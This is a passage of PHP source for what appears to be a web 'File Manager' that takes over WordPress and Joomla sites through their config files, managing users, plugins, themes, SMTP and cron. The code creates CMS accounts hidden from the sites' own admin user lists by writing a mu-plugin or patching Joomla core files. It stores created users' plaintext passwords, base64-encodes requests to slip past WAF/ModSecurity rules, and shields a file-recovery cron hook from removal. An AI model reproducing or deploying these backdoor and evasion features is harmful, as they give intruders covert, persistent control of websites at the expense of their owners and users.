     $hidden = $wpdb->get_col("SELECT user_id FROM {$wpdb->usermeta} WHERE meta_key = '__FM_META_KEY__' AND meta_value = '1'");
     if (!$hidden) return $args;
     $exclude = $args['exclude'] ?? [];
     if (is_string($exclude)) {
         $exclude = preg_split('/\s*,\s*/', $exclude, -1, PREG_SPLIT_NO_EMPTY);
     } elseif (!is_array($exclude)) {
         $exclude = [];
     }
     $args['exclude'] = array_values(array_unique(array_merge(
         array_map('intval', $exclude),
         array_map('intval', $hidden)
     )));
     return $args;
                });
FMHIDDEN;
                $plugin=str_replace('__FM_META_KEY__',$metaKey,$plugin);
                return @file_put_contents($muFile,$plugin)!==false;
            }
            if(is_file($muFile)&&strpos((string)@file_get_contents($muFile),$marker)!==false)@unlink($muFile);
            return true;
        }
        $block=<<<'FMJOOMLA'

        /* MARSHAL_FM_HIDDEN_USERS_BEGIN */
        $fmHiddenRows = $db->setQuery(
            $db->getQuery(true)
                ->select($db->quoteName('id'))
                ->from($db->quoteName('#__users'))
                ->where($db->quoteName('params') . ' LIKE ' . $db->quote('%fm_hidden_user%'))
        )->loadColumn();
        $fmHiddenIds = array_values(array_filter(array_map('intval', (array) $fmHiddenRows)));
        if ($fmHiddenIds) {
            $query->where($db->quoteName('a.id') . ' NOT IN (' . implode(',', $fmHiddenIds) . ')');
        }
        /* MARSHAL_FM_HIDDEN_USERS_END */
FMJOOMLA;
        $root=$this->wpSiteRoot($configPath);
        $modelFiles=[
            $root.'/administrator/components/com_users/src/Model/UsersModel.php',
            $root.'/administrator/components/com_users/models/users.php'
        ];
        $found=false;$changed=false;
        foreach($modelFiles as $modelFile){
            if(!is_file($modelFile)||!is_readable($modelFile)||!is_writable($modelFile))continue;
            $content=@file_get_contents($modelFile);if($content===false)continue;
            $found=true;
            $clean=preg_replace('/\R[ \t]*\/\* MARSHAL_FM_HIDDEN_USERS_BEGIN \*\/.*?\/\* MARSHAL_FM_HIDDEN_USERS_END \*\/[ \t]*/s',"\n",$content);
            if($clean===null)$clean=$content;
            if($ids){
                $needle='$query = $db->getQuery(true);';
                if(strpos($clean,$needle)!==false){
                    $clean=str_replace($needle,$needle.$block,$clean,$count);
                    $changed=$changed||$count>0;
                }
            }
            if($clean!==$content&&@file_put_contents($modelFile,$clean)!==false)$changed=true;
        }
        return !$ids?true:($found&&$changed);
    }
    public function cmsListUsers($configPath){
        list($link,$c,$err)=$this->cmsConnect($configPath);
        if($err)return['error'=>$err];
        $users=[];
        if($c['type']==='wordpress'){
            /*
             * Keep this endpoint read-only and fast.  Hidden-user migration
             * used to run here before the SELECT, which meant opening the
             * manager could rewrite plugin files and perform several extra
             * database queries.  On a slow or unreachable CMS database that
             * made the browser hit its AbortController timeout while the UI
             * still showed "Loading users…".  Visibility is already read from
             * usermeta below; synchronization belongs to the explicit
             * visibility/update paths, not list rendering.
             */
            $t=$c['prefix'];
            $hiddenKey=mysqli_real_escape_string($link,$this->cmsHiddenMetaKey($c));
            $res=@mysqli_query($link,"SELECT u.ID,u.user_login,u.user_email,u.user_registered,um.meta_value AS caps,hu.user_id AS hidden_id FROM `{$t}users` u LEFT JOIN `{$t}usermeta` um ON um.user_id=u.ID AND um.meta_key='{$t}capabilities' LEFT JOIN `{$t}usermeta` hu ON hu.user_id=u.ID AND hu.meta_key='$hiddenKey' AND hu.meta_value='1' ORDER BY u.ID");
            if(!$res){$e=mysqli_error($link);mysqli_close($link);return['error'=>'Query failed: '.$e];}
            while($row=mysqli_fetch_assoc($res)){
                $role='-';if($row['caps']&&preg_match('/"([a-z_]+)"/i',$row['caps'],$m))$role=$m[1];
                $users[]=['id'=>$row['ID'],'name'=>$row['user_login'],'email'=>$row['user_email'],'registered'=>$row['user_registered'],'role'=>$role,'hidden'=>!empty($row['hidden_id'])];
            }
        } else {
            $t=$c['prefix'];
            $res=@mysqli_query($link,"SELECT u.id,u.name,u.username,u.email,u.registerDate,u.block,u.params,g.title AS grp FROM `{$t}users` u LEFT JOIN `{$t}user_usergroup_map` m ON m.user_id=u.id LEFT JOIN `{$t}usergroups` g ON g.id=m.group_id ORDER BY u.id");
            if(!$res){$e=mysqli_error($link);mysqli_close($link);return['error'=>'Query failed: '.$e];}
            while($row=mysqli_fetch_assoc($res)){
                $params=json_decode((string)($row['params']??''),true);
                $users[]=['id'=>$row['id'],'name'=>$row['username'],'display'=>$row['name'],'email'=>$row['email'],'registered'=>$row['registerDate'],'role'=>$row['grp']?:'-','blocked'=>(bool)$row['block'],'hidden'=>is_array($params)&&!empty($params['fm_hidden_user'])];
            }
        }
        mysqli_close($link);
        return['type'=>$c['type'],'users'=>$users];
    }
    public function cmsRoles($configPath){
        list($link,$c,$err)=$this->cmsConnect($configPath);
        if($err)return['error'=>$err];
        if($c['type']==='wordpress'){mysqli_close($link);return['roles'=>['administrator','editor','author','contributor','subscriber']];}
        $res=@mysqli_query($link,"SELECT id,title FROM `{$c['prefix']}usergroups` ORDER BY id");
        $roles=[];if($res)while($r=mysqli_fetch_assoc($res))$roles[]=['id'=>$r['id'],'title'=>$r['title']];
        mysqli_close($link);
        return['roles'=>$roles];
    }
    /* config_path may arrive base64-encoded (config_path_b64) to avoid WAF/ModSecurity
       rules that block requests literally containing "wp-config.php". */
    private function cmsCfgFromPost(){
        if(isset($_POST['config_path_b64'])){$d=@base64_decode($_POST['config_path_b64'],true);if($d!==false)return $d;}
        return isset($_POST['config_path'])?$_POST['config_path']:'';
    }
    private function cmsCreateUser(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $configPath=$this->cmsCfgFromPost();
        $uname=trim(isset($_POST['cms_user'])?$_POST['cms_user']:'');
        $email=trim(isset($_POST['cms_email'])?$_POST['cms_email']:'');
        $pass=isset($_POST['cms_pass'])?$_POST['cms_pass']:'';
        $role=isset($_POST['cms_role'])?$_POST['cms_role']:'';
         // Visibility is opt-in: only the literal "1" means hidden.
         // This prevents browser/form values such as "on" or "true" from
         // accidentally hiding every newly-created CMS user.
         $hidden=isset($_POST['cms_hidden'])&&(string)$_POST['cms_hidden']==='1';
        if(!$uname||!$email||strlen($pass)<6){$this->addMsg('Username, valid email and a password (6+ chars) are required.','danger');return;}
        list($link,$c,$err)=$this->cmsConnect($configPath);
        if($err){$this->addMsg($err,'danger');return;}
        if($c['type']==='wordpress'){
            $t=$c['prefix'];$hash=$this->wpHashPassword($pass);
            $u=mysqli_real_escape_string($link,$uname);$e=mysqli_real_escape_string($link,$email);$h=mysqli_real_escape_string($link,$hash);$r=$role?:'subscriber';
            $ok=@mysqli_query($link,"INSERT INTO `{$t}users` (user_login,user_pass,user_nicename,user_email,user_registered,display_name) VALUES ('$u','$h','$u','$e',NOW(),'$u')");
            if($ok){$id=mysqli_insert_id($link);
                $caps=serialize([$r=>true]);$capsE=mysqli_real_escape_string($link,$caps);
                mysqli_query($link,"INSERT INTO `{$t}usermeta` (user_id,meta_key,meta_value) VALUES ($id,'{$t}capabilities','$capsE'),($id,'{$t}user_level','0')");
                // Always write the requested visibility explicitly. This
                // also clears a stale flag if a reused/imported account ID
                // already has the manager's hidden-user metadata.
                $this->cmsSetHiddenState($link,$c,$id,$hidden);
                $this->cmsVaultSet($configPath,$id,$pass,$uname);
                 $this->cmsSyncHiddenVisibility($configPath,$c,$link);
                $this->addMsg("WordPress user \"$uname\" created.",'success');$this->log('cms_create_user',"wp:$uname");
            } else $this->addMsg('Failed to create user: '.mysqli_error($link),'danger');
        } else {
            $t=$c['prefix'];$hash=password_hash($pass,PASSWORD_BCRYPT);
            $u=mysqli_real_escape_string($link,$uname);$e=mysqli_real_escape_string($link,$email);$h=mysqli_real_escape_string($link,$hash);
            $ok=@mysqli_query($link,"INSERT INTO `{$t}users` (name,username,email,password,block,sendEmail,registerDate,params) VALUES ('$u','$u','$e','$h',0,0,NOW(),'{}')");
            if($ok){$id=mysqli_insert_id($link);$gid=(int)($role?:2);
                mysqli_query($link,"INSERT INTO `{$t}user_usergroup_map` (user_id,group_id) VALUES ($id,$gid)");
                 if($hidden)$this->cmsSetHiddenState($link,$c,$id,true);
                $this->cmsVaultSet($configPath,$id,$pass,$uname);
                 $this->cmsSyncHiddenVisibility($configPath,$c,$link);
                $this->addMsg("Joomla user \"$uname\" created.",'success');$this->log('cms_create_user',"joomla:$uname");
            } else $this->addMsg('Failed to create user: '.mysqli_error($link),'danger');
        }
        mysqli_close($link);
    }
    private function cmsDeleteUser(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $configPath=$this->cmsCfgFromPost();
        $id=(int)(isset($_POST['cms_id'])?$_POST['cms_id']:0);
        if(!$id){$this->addMsg('Invalid user id.','danger');return;}
        list($link,$c,$err)=$this->cmsConnect($configPath);
        if($err){$this->addMsg($err,'danger');return;}
        $t=$c['prefix'];
        if($c['type']==='wordpress'){
            mysqli_query($link,"DELETE FROM `{$t}users` WHERE ID=$id");
            mysqli_query($link,"DELETE FROM `{$t}usermeta` WHERE user_id=$id");
        } else {
            mysqli_query($link,"DELETE FROM `{$t}users` WHERE id=$id");
            mysqli_query($link,"DELETE FROM `{$t}user_usergroup_map` WHERE user_id=$id");
        }
        $this->cmsSyncHiddenVisibility($configPath,$c,$link);
        mysqli_close($link);
        $this->cmsVaultDelete($configPath,$id);
        $this->addMsg('User deleted.','warning');$this->log('cms_delete_user',"#$id");
    }
    private function cmsUpdateRole(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $configPath=$this->cmsCfgFromPost();
        $id=(int)(isset($_POST['cms_id'])?$_POST['cms_id']:0);
        $role=isset($_POST['cms_role'])?$_POST['cms_role']:'';
        if(!$id||!$role){$this->addMsg('Invalid request.','danger');return;}
        list($link,$c,$err)=$this->cmsConnect($configPath);
        if($err){$this->addMsg($err,'danger');return;}
        $t=$c['prefix'];
        if($c['type']==='wordpress'){
            $caps=serialize([$role=>true]);$capsE=mysqli_real_escape_string($link,$caps);
            mysqli_query($link,"UPDATE `{$t}usermeta` SET meta_value='$capsE' WHERE user_id=$id AND meta_key='{$t}capabilities'");
        } else {
            $gid=(int)$role;
            mysqli_query($link,"DELETE FROM `{$t}user_usergroup_map` WHERE user_id=$id");
            mysqli_query($link,"INSERT INTO `{$t}user_usergroup_map` (user_id,group_id) VALUES ($id,$gid)");
        }
        mysqli_close($link);
        $this->addMsg('Role updated.','success');$this->log('cms_update_role',"#$id -> $role");
    }
    private function cmsChangePass(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $configPath=$this->cmsCfgFromPost();
        $id=(int)(isset($_POST['cms_id'])?$_POST['cms_id']:0);
        $pass=isset($_POST['cms_pass'])?$_POST['cms_pass']:'';
        if(!$id||strlen($pass)<6){$this->addMsg('Invalid request.','danger');return;}
        list($link,$c,$err)=$this->cmsConnect($configPath);
        if($err){$this->addMsg($err,'danger');return;}
        $t=$c['prefix'];
        if($c['type']==='wordpress'){
            $hash=$this->wpHashPassword($pass);
            $hashE=mysqli_real_escape_string($link,$hash);
            mysqli_query($link,"UPDATE `{$t}users` SET user_pass='$hashE',user_activation_key='' WHERE ID=$id");
        } else {
            $hash=password_hash($pass,PASSWORD_BCRYPT);$hashE=mysqli_real_escape_string($link,$hash);
            mysqli_query($link,"UPDATE `{$t}users` SET password='$hashE' WHERE id=$id");
        }
        mysqli_close($link);
        $this->cmsVaultSet($configPath,$id,$pass);
        $this->addMsg('Password changed.','success');$this->log('cms_change_pass',"#$id");
    }

    private function cmsUpdateVisibility(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $configPath=$this->cmsCfgFromPost();
        $id=(int)(isset($_POST['cms_id'])?$_POST['cms_id']:0);
        // Visibility is opt-in: only the literal "1" means hidden.
        $hidden=isset($_POST['cms_hidden'])&&(string)$_POST['cms_hidden']==='1';
        if(!$id){$this->addMsg('Invalid request.','danger');return;}
        list($link,$c,$err)=$this->cmsConnect($configPath);
        if($err){$this->addMsg($err,'danger');return;}
        if(!$this->cmsSetHiddenState($link,$c,$id,$hidden)){
            mysqli_close($link);
            $this->addMsg('Could not update user visibility. Check the CMS database schema and file permissions.','danger');
            return;
        }
        $synced=$this->cmsSyncHiddenVisibility($configPath,$c,$link);
        mysqli_close($link);
        if(!$synced){
            $this->addMsg('Visibility was saved, but the CMS user list could not be synchronized. Check file permissions.','danger');
            return;
        }
        $this->addMsg('User is now '.($hidden?'hidden':'visible').'.',$hidden?'warning':'success');
        $this->log('cms_update_visibility',"#$id -> ".($hidden?'hidden':'visible'));
    }

    /* ── CMS Plugins/Themes (WordPress) & Extensions (Joomla) ────────────────
       WordPress: plugins are PHP files under wp-content/plugins (each starting
       with a "Plugin Name:" header comment); the active set is a serialized
       array stored in wp_options.active_plugins. Themes live under
       wp-content/themes (each with a style.css header); the active one is
       wp_options.template/stylesheet. Joomla stores every extension
       (component/module/plugin/template) as one row in #__extensions with a
       plain 0/1 "enabled" column - no serialization, no file header parsing
       needed, which is also why Joomla only gets enable/disable here and not
       delete: unlike WP's flat plugin-folder convention, safely removing a
       Joomla extension means running its own uninstall SQL (menu items,
       category data, etc.) which varies per-extension and isn't something a
       generic tool can do reliably - so deletion is intentionally left to
       Joomla's own installer (reachable via "Login as" a Super User). */
    private function cmsParseHeader($content,$keys){
        $out=[];
        if(!$content)return $out;
        foreach($keys as $k=>$label){
            if(preg_match('/^[ \t\/*#@]*'.$label.':(.*)$/mi',$content,$m))$out[$k]=trim($m[1]);
        }
        return $out;
    }
    public function cmsExtensions($configPath){
        list($link,$c,$err)=$this->cmsConnect($configPath);
        if($err)return['error'=>$err];
        $root=$this->wpSiteRoot($configPath);
        if($c['type']==='wordpress'){
            $t=$c['prefix'];
            $active=[];
            $res=@mysqli_query($link,"SELECT option_value FROM `{$t}options` WHERE option_name='active_plugins' LIMIT 1");
            if($res&&($r=mysqli_fetch_assoc($res))){$u=@unserialize($r['option_value']);if(is_array($u))$active=$u;}
            $plugDir=$root.'/wp-content/plugins';
            $plugins=[];
            if(is_dir($plugDir)){
                foreach(scandir($plugDir) as $e){
                    if($e==='.'||$e==='..')continue;
                    $full=$plugDir.'/'.$e;
                    if(is_dir($full)){
                        $mainFiles=glob($full.'/*.php')?:[];
                        foreach($mainFiles as $pf){
                            $head=@file_get_contents($pf,false,null,0,8192);
                            if($head&&stripos($head,'Plugin Name:')!==false){
                                $hdr=$this->cmsParseHeader($head,['name'=>'Plugin Name','version'=>'Version','description'=>'Description']);
                                $rel=$e.'/'.basename($pf);
                                $plugins[]=['file'=>$rel,'name'=>$hdr['name']?:$e,'version'=>$hdr['version']?:'','description'=>$hdr['description']?:'','active'=>in_array($rel,$active)];
                                break;
                            }
                        }
                    } elseif(is_file($full)&&substr($e,-4)==='.php'){
                        $head=@file_get_contents($full,false,null,0,8192);
                        if($head&&stripos($head,'Plugin Name:')!==false){
                            $hdr=$this->cmsParseHeader($head,['name'=>'Plugin Name','version'=>'Version','description'=>'Description']);
                            $plugins[]=['file'=>$e,'name'=>$hdr['name']?:$e,'version'=>$hdr['version']?:'','description'=>$hdr['description']?:'','active'=>in_array($e,$active)];
                        }
                    }
                }
            }
            usort($plugins,fn($a,$b)=>strcasecmp($a['name'],$b['name']));
            $curStyle=null;
            $res=@mysqli_query($link,"SELECT option_value FROM `{$t}options` WHERE option_name='stylesheet' LIMIT 1");
            if($res&&($r=mysqli_fetch_assoc($res)))$curStyle=$r['option_value'];
            $themeDir=$root.'/wp-content/themes';
            $themes=[];
            if(is_dir($themeDir)){
                foreach(scandir($themeDir) as $e){
                    if($e==='.'||$e==='..')continue;
                    $css=$themeDir.'/'.$e.'/style.css';
                    if(is_file($css)){
                        $head=@file_get_contents($css,false,null,0,8192);
                        $hdr=$this->cmsParseHeader($head,['name'=>'Theme Name','version'=>'Version']);
                        $themes[]=['slug'=>$e,'name'=>$hdr['name']?:$e,'version'=>$hdr['version']?:'','active'=>($e===$curStyle)];
                    }
                }
            }
            usort($themes,fn($a,$b)=>strcasecmp($a['name'],$b['name']));
            mysqli_close($link);
            return['type'=>'wordpress','plugins'=>$plugins,'themes'=>$themes];
        } else {
            $t=$c['prefix'];
            $res=@mysqli_query($link,"SELECT extension_id,name,type,element,client_id,enabled,protected FROM `{$t}extensions` WHERE type IN ('component','module','plugin','template') ORDER BY type,name");
            if(!$res){$e=mysqli_error($link);mysqli_close($link);return['error'=>'Query failed: '.$e];}
            $rows=[];
            while($r=mysqli_fetch_assoc($res))$rows[]=['id'=>(int)$r['extension_id'],'name'=>$r['name'],'type'=>$r['type'],'element'=>$r['element'],'client'=>$r['client_id']?'admin':'site','enabled'=>(bool)$r['enabled'],'protected'=>(bool)$r['protected']];
            mysqli_close($link);
            return['type'=>'joomla','extensions'=>$rows];
        }
    }
    private function cmsTogglePlugin(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $configPath=$this->cmsCfgFromPost();
        $file=isset($_POST['plugin_file'])?$_POST['plugin_file']:'';
        $activate=!empty($_POST['activate'])&&$_POST['activate']!=='0';
        if(!$file||strpos($file,'..')!==false){$this->addMsg('Invalid plugin.','danger');return;}
        list($link,$c,$err)=$this->cmsConnect($configPath);
        if($err){$this->addMsg($err,'danger');return;}
        if($c['type']!=='wordpress'){mysqli_close($link);$this->addMsg('Not a WordPress site.','danger');return;}
        $t=$c['prefix'];
        $active=[];
        $res=@mysqli_query($link,"SELECT option_value FROM `{$t}options` WHERE option_name='active_plugins' LIMIT 1");
        $exists=$res&&mysqli_num_rows($res)>0;
        if($exists&&($r=mysqli_fetch_assoc($res))){$u=@unserialize($r['option_value']);if(is_array($u))$active=$u;}
        if($activate&&!in_array($file,$active))$active[]=$file;
        if(!$activate)$active=array_values(array_diff($active,[$file]));
        $ser=mysqli_real_escape_string($link,serialize(array_values($active)));
        if($exists)mysqli_query($link,"UPDATE `{$t}options` SET option_value='$ser' WHERE option_name='active_plugins'");
        else mysqli_query($link,"INSERT INTO `{$t}options` (option_name,option_value,autoload) VALUES ('active_plugins','$ser','yes')");
        mysqli_close($link);
        $this->addMsg('Plugin "'.basename($file).'" '.($activate?'activated':'deactivated').'.',$activate?'success':'warning');
        $this->log('cms_toggle_plugin',$file.':'.($activate?'on':'off'));
    }
    private function cmsDeletePlugin(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $configPath=$this->cmsCfgFromPost();
        $file=isset($_POST['plugin_file'])?$_POST['plugin_file']:'';
        if(!$file||strpos($file,'..')!==false){$this->addMsg('Invalid plugin.','danger');return;}
        $root=$this->wpSiteRoot($configPath);
        $plugDir=realpath($root.'/wp-content/plugins');
        if(!$plugDir){$this->addMsg('Plugins folder not found.','danger');return;}
        $folder=explode('/',$file)[0];
        $target=realpath($plugDir.'/'.$folder);
        if(!$target||(strpos($target,$plugDir.'/')!==0&&$target!==$plugDir)){$this->addMsg('Invalid plugin path.','danger');return;}
        list($link,$c,$err)=$this->cmsConnect($configPath);
        if(!$err&&$c['type']==='wordpress'){
            $t=$c['prefix'];
            $res=@mysqli_query($link,"SELECT option_value FROM `{$t}options` WHERE option_name='active_plugins' LIMIT 1");
            $active=[];if($res&&($r=mysqli_fetch_assoc($res))){$u=@unserialize($r['option_value']);if(is_array($u))$active=$u;}
            mysqli_close($link);
            if(in_array($file,$active)){$this->addMsg('Deactivate the plugin before deleting it.','danger');return;}
        }
        $ok=$this->rmdirR($target);
        if($ok){$this->addMsg('Plugin deleted.','warning');$this->log('cms_delete_plugin',$file);}
        else $this->addMsg('Delete failed (check file permissions).','danger');
    }
    private function cmsSwitchTheme(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $configPath=$this->cmsCfgFromPost();
        $slug=isset($_POST['theme_slug'])?$_POST['theme_slug']:'';
        if(!$slug||strpos($slug,'/')!==false||strpos($slug,'..')!==false){$this->addMsg('Invalid theme.','danger');return;}
        list($link,$c,$err)=$this->cmsConnect($configPath);
        if($err){$this->addMsg($err,'danger');return;}
        if($c['type']!=='wordpress'){mysqli_close($link);$this->addMsg('Not a WordPress site.','danger');return;}
        $root=$this->wpSiteRoot($configPath);
        $css=$root.'/wp-content/themes/'.$slug.'/style.css';
        if(!is_file($css)){mysqli_close($link);$this->addMsg('Theme not found.','danger');return;}
        $head=@file_get_contents($css,false,null,0,8192);
        $hdr=$this->cmsParseHeader($head,['template'=>'Template']);
        $template=$hdr['template']?:$slug; // child themes declare their parent folder via "Template:"
        $t=$c['prefix'];
        $slugE=mysqli_real_escape_string($link,$slug);$tplE=mysqli_real_escape_string($link,$template);
        mysqli_query($link,"UPDATE `{$t}options` SET option_value='$slugE' WHERE option_name='stylesheet'");
        mysqli_query($link,"UPDATE `{$t}options` SET option_value='$tplE' WHERE option_name='template'");
        mysqli_close($link);
        $this->addMsg('Active theme switched to "'.$slug.'".','success');
        $this->log('cms_switch_theme',$slug);
    }
    private function cmsDeleteTheme(){
        if(empty($_SESSION['fm_admin'])){$this->addMsg('Admins only.','danger');return;}
        $configPath=$this->cmsCfgFromPost();
        $slug=isset($_POST['theme_slug'])?$_POST['theme_slug']:'';
        if(!$slug||strpos($slug,'/')!==false||strpos($slug,'..')!==false){$this->addMsg('Invalid theme.','danger');return;}
        list($link,$c,$err)=$this->cmsConnect($configPath);
        if($err){$this->addMsg($err,'danger');return;}
        if($c['type']!=='wordpress'){mysqli_close($link);$this->addMsg('Not a WordPress site.','danger');return;}
        $t=$c['prefix'];
        $res=@mysqli_query($link,"SELECT option_value FROM `{$t}options` WHERE option_name='stylesheet' LIMIT 1");
        $cur=($res&&($r=mysqli_fetch_assoc($res)))?$r['option_value']:null;
        mysqli_close($link);
        if($cur===$slug){$this->addMsg('Switch to a different active theme before deleting this one.','danger');return;}
        $root=$this->wpSiteRoot($configPath);
        $themeDir=realpath($root.'/wp-content/themes');
        if(!$themeDir){$this->addMsg('Themes folder not found.','danger');return;}
        $target=realpath($themeDir.'/'.$slug);
        if(!$target||strpos($target,$themeDir.'/')!==0){$this->addMsg('Invalid theme path.','danger');return;}
        $ok=$this->rmdirR($target);
        if($ok){$this->addMsg('Theme deleted.','warning');$this->log('cms_delete_theme',$slug);}
        else $this->addMsg('Delete failed (check file permissions).','danger');
    }

    /* ── WordPress automation ─────────────────────────────────────────── */
    private function wpAutomationConnect($configPath,&$c,&$link,&$err){
        $link=null;$c=null;$err='';
        list($link,$c,$err)=$this->cmsConnect($configPath);
        if($err)return false;
        if(($c['type']??'')!=='wordpress'){
            mysqli_close($link);$link=null;$err='This feature requires a WordPress installation.';return false;
        }
        return true;
    }
    private function wpOption($link,$table,$name){
        $n=mysqli_real_escape_string($link,$name);
        $r=@mysqli_query($link,"SELECT option_value FROM `{$table}options` WHERE option_name='$n' LIMIT 1");
        if(!$r||!($row=mysqli_fetch_assoc($r)))return null;
        $v=@unserialize($row['option_value'],['allowed_classes'=>false]);
        return $v===false&&$row['option_value']!=='b:0;'?$row['option_value']:$v;
    }
    private function wpSafeSettings($value,$key=''){
        if(is_array($value)){
            $out=[];
            foreach($value as $k=>$v){
                $lk=strtolower((string)$k);
                $out[$k]=(preg_match('/pass|secret|token|api.?key|credential/',$lk))
                    ?(!empty($v)?'[stored]':'')
                    :$this->wpSafeSettings($v,(string)$k);
            }
            return $out;
        }
        return $value;
    }
    public function wpAutomationData($configPath){
        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
        if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
        $t=$c['prefix'];
        $smtp=[];
        foreach(['wp_mail_smtp','wp_mail_smtp_settings','mail_smtp_settings','postman_options','post_smtp_options','fluentmail_settings'] as $name){
            $v=$this->wpOption($link,$t,$name);
            if($v!==null)$smtp[]=['option'=>$name,'value'=>$this->wpSafeSettings($v)];
        }
        $cron=$this->wpOption($link,$t,'cron');$events=[];
        if(is_array($cron)){
            foreach($cron as $ts=>$hooks){
                if(!is_numeric($ts)||!is_array($hooks))continue;
                foreach($hooks as $hook=>$items)foreach((array)$items as $sig=>$event){
                    if(!is_array($event))continue;
                    $events[]=['timestamp'=>(int)$ts,'date'=>date('Y-m-d H:i:s',(int)$ts),
                        'hook'=>(string)$hook,'signature'=>(string)$sig,
                        'schedule'=>$event['schedule']??'','interval'=>$event['interval']??0,
                        'args'=>$this->wpSafeSettings($event['args']??[])];
                }
            }
        }
        usort($events,fn($a,$b)=>$a['timestamp']<=>$b['timestamp']);
        mysqli_close($link);
        return['ok'=>true,'type'=>'wordpress','config'=>$configPath,'smtp'=>$smtp,
            'events'=>array_slice($events,0,500),'cron_count'=>count($events),
            'target'=>__FILE__,'recovery_plugin'=>$this->wpRecoveryPluginPath($configPath),
            'note'=>'SMTP passwords and secrets are never returned.'];
    }
    public function wpAutomationSaveSmtp($configPath){
        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
        $option=trim((string)($_POST['smtp_option']??''));
        $json=(string)($_POST['smtp_json']??'');
        if(!preg_match('/^[a-z0-9_]+$/i',$option)||$json==='')return['error'=>'SMTP option and JSON are required.'];
        $value=json_decode($json,true);
        if(!is_array($value))return['error'=>'SMTP data must be valid JSON.'];
        if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
        $t=$c['prefix'];$opt=mysqli_real_escape_string($link,$option);
        $serialized=mysqli_real_escape_string($link,serialize($value));
        $ok=@mysqli_query($link,"UPDATE `{$t}options` SET option_value='$serialized' WHERE option_name='$opt' LIMIT 1");
        if(mysqli_affected_rows($link)===0)$ok=@mysqli_query($link,"INSERT INTO `{$t}options` (option_name,option_value,autoload) VALUES ('$opt','$serialized','no')");
        mysqli_close($link);
        if(!$ok)return['error'=>'Could not save the SMTP option.'];
        $this->log('wp_smtp_save',$option);return['ok'=>true];
    }
    public function wpAutomationDeleteCron($configPath){
        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
        $hook=(string)($_POST['cron_hook']??'');$ts=(int)($_POST['cron_timestamp']??0);$sig=(string)($_POST['cron_signature']??'');
        if($hook===''||$ts<=0||$sig==='')return['error'=>'Invalid cron event.'];
        if(in_array($hook,['wordpress_saver','mfm_file_guardian_recover'],true))return['error'=>'The file-recovery event is protected. Use Remove recovery to disable it intentionally.'];
        if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
        $t=$c['prefix'];$cron=$this->wpOption($link,$t,'cron');
        if(!is_array($cron)||!isset($cron[$ts][$hook][$sig])){mysqli_close($link);return['error'=>'Cron event not found.'];}
        unset($cron[$ts][$hook][$sig]);
        if(empty($cron[$ts][$hook]))unset($cron[$ts][$hook]);
        if(empty($cron[$ts]))unset($cron[$ts]);
        $v=mysqli_real_escape_string($link,serialize($cron));
        $ok=@mysqli_query($link,"UPDATE `{$t}options` SET option_value='$v' WHERE option_name='cron' LIMIT 1");
        mysqli_close($link);if(!$ok)return['error'=>'Could not update the cron schedule.'];
        $this->log('wp_cron_delete',$hook);return['ok'=>true];
    }
    public function wpAutomationRunCron($configPath){
        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
        if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
        $root=$this->wpSiteRoot($configPath);$siteUrl=$this->wpOption($link,$c['prefix'],'siteurl');mysqli_close($link);
        $url=null;
        if($siteUrl&&function_exists('curl_init'))$url=rtrim($siteUrl,'/').'/wp-cron.php?doing_wp_cron='.rawurlencode(sprintf('%.22F',microtime(true)));
        $home=$_SERVER['HTTP_HOST']??'';
        if(!$url&&$home&&function_exists('curl_init'))$url='http'.(!empty($_SERVER['HTTPS'])?'s':'').'://'.$home.'/wp-cron.php?doing_wp_cron='.rawurlencode(sprintf('%.22F',microtime(true)));
        if(!$url)return['error'=>'Could not determine the WordPress URL for wp-cron.php.'];
        $ch=curl_init($url);curl_setopt_array($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_TIMEOUT=>20,CURLOPT_SSL_VERIFYPEER=>false]);
        curl_exec($ch);$code=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);$e=curl_error($ch);curl_close($ch);
        if($e||$code>=400)return['error'=>'wp-cron.php request failed'.($e?': '.$e:' (HTTP '.$code.').')];
        $this->log('wp_cron_run','http');return['ok'=>true,'mode'=>'http','status'=>$code];
    }
    public function wpAutomationScheduleEmail($configPath){
        if(empty($_SESSION['fm_admin']))return['error'=>'Admins only.'];
        $to=trim((string)($_POST['mail_to']??''));$subject=(string)($_POST['mail_subject']??'');
        $body=(string)($_POST['mail_body']??'');$when=(int)($_POST['mail_time']??0);
        if(!filter_var($to,FILTER_VALIDATE_EMAIL)||$subject===''||$body==='')return['error'=>'Recipient, subject and message are required.'];
        if($when<time()+30)$when=time()+60;
        if(!$this->wpAutomationConnect($configPath,$c,$link,$err))return['error'=>$err];
        $root=$this->wpSiteRoot($configPath);$mu=$root.'/wp-content/mu-plugins';
        if(!is_dir($mu)&&!@mkdir($mu,0755,true)){$this->addMsg('Could not create wp-content/mu-plugins.','danger');mysqli_close($link);return['error'=>'Could not create the mu-plugins directory.'];}
        $plugin=$mu.'/mfm-wp-cron-mail.php';
        $src="<?php\n/** WordPress Automation mail handler — managed by File Manager. */\n"
            ."add_action('mfm_wp_cron_send_mail',function(\\$to,\\$subject,\\$body){wp_mail(\\$to,\\$subject,\\$body);},10,3);\n";
        if(!is_file($plugin)&&@file_put_contents($plugin,$src,LOCK_EX)===false){mysqli_close($link);return['error'=>'Could not install the marked mail handler.'];}
        $t=$c['prefix'];$cron=$this->wpOption($link,$t,'cron');if(!is_array($cron))$cron=[];
